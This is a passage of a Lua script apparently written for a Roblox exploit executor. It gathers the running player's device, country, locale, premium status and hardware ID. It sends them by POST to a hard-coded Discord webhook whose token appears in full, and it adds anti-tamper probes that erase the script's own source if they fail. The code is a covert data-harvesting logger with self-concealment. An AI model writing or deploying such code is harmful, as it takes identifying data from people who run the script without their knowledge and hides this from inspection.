          ["value"] = device,
          ["inline"] = false
        },
        {
          ["name"] = "国家和语言",
          ["value"] = "国家: " .. game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer),
          ["inline"] = false
        },
        {
          ["name"] = "语言",
          ["value"] = " 语言: " .. game.Players.LocalPlayer.LocaleId,
          ["inline"] = false
        },
        {
          ["name"] = "会员状态",
          ["value"] = Premium,
          ["inline"] = false
        },
        {
          ["name"] = "HWID",
          ["value"] = gethwid(),
          ["inline"] = true
        },
      }
    }
  }
}

local request = http_request or request or HttpPost or syn.request
request({
  Url = "https://discord.com/api/webhooks/1468108097607172126/gLQm1hoN3Jsnlirk_t8zfgqVwUr_7AdEtLCGqQO5oNi2E7nJgrJOudijClcsuqpGwvc8",
  Method = "POST",
  Headers = {["Content-Type"] = "application/json"},
  Body = game.HttpService:JSONEncode(msg)
})

end

local function safeEntry()
    if not probeArith() then return nil, "block:arith" end
    if not probeCall()  then return nil, "block:call"  end
    if not probeFS()    then return nil, "block:fs"    end
    return coreLogic()
end

local success, tag = safeEntry()
if not success then
    warn("LM:已拦截异常执行 (" .. tostring(tag) .. ")")
    script:ClearAllChildren()
    script.Source = ""
    return
end